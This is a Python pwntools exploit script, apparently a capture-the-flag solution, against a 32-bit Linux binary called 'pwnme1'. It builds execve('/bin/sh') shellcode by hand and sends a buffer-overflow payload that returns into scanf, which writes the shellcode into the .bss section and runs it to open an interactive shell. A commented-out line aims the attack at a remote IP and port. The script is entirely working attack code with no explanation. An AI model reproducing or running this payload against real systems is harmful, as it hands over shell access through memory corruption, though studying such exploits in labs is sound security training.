#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context(terminal = ['deepin-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

def debug(addr = '0x08048676'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

#  shellcode = asm(shellcraft.sh())
shellcode =  asm("push 0x68")
shellcode += asm("push 0x732f2f2f")
shellcode += asm("push 0x6e69622f")
shellcode += asm("mov ebx, esp")
shellcode += asm("push 0x1010101")
shellcode += asm("xor dword ptr [esp], 0x1016972")
shellcode += asm("xor ecx, ecx")
shellcode += asm("push ecx")
shellcode += asm("push 4")
shellcode += asm("pop ecx")
shellcode += asm("add ecx, esp")
shellcode += asm("push ecx")
shellcode += asm("mov ecx, esp")
shellcode += asm("xor edx, edx")
shellcode += asm("push 0x1b")
shellcode += asm("and byte ptr [esp], 0xf")
shellcode += asm("pop eax")
shellcode += asm("int 0x80")

#  print disasm(shellcode)

elf = ELF('./pwnme1')
scanf_addr = elf.symbols['__isoc99_scanf']
#  print "%x" % scanf_addr
scanf_fmt_addr = elf.search('%s').next()
#  print "%x" % scanf_fmt_addr
bss_addr = elf.bss() 
#  print "%x" % bss_addr
offset = 0xa4 + 0x4

io = process('./pwnme1')
# io = remote('104.224.169.128', 18889)

io.recvuntil('Exit    \n')
io.sendline('5')
io.recvuntil('fruit:')

payload = 'A' * offset
payload += p32(scanf_addr)
payload += p32(bss_addr)
payload += p32(scanf_fmt_addr)
payload += p32(bss_addr)

#  debug()
io.sendline(payload)
io.sendline(shellcode)

io.interactive()

io.close()
